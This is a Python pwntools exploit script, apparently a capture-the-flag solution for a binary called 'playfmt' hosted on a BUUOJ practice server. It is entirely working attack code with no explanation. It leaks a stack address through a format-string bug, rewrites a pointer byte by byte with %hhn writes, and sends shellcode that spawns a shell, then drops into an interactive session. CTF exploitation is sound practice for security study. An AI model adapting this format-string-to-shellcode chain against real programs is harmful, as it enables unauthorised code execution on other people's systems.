import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *


binary='playfmt'


elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/i386-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',27969)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("local")
			libc=pdbg.libc
			#io=pdbg.run("debug")
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]



		# pay=fmtstr_payload(8,{elf.got['printf']:system_addr},write_size='byte')
		io.recv()
		io.sendline('%6$p')
		stack_addr=int(io.recvline(),16)
		str1=(stack_addr&0xff)-0xc
		pay='%'+str(str1)+'c%6$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(0x70)+'c%10$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(str1+1)+'c%6$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(0xa0)+'c%10$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(str1+2)+'c%6$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(0x4)+'c%10$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(str1+3)+'c%6$hhn'
		io.sendline(pay)
		io.recv()
		pay='%'+str(0x8)+'c%10$hhn'
		io.sendline(pay)
		io.recv()
		pay='quit'+'\x00'*0xc+asm(shellcraft.sh())
		io.sendline(pay)

		



		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue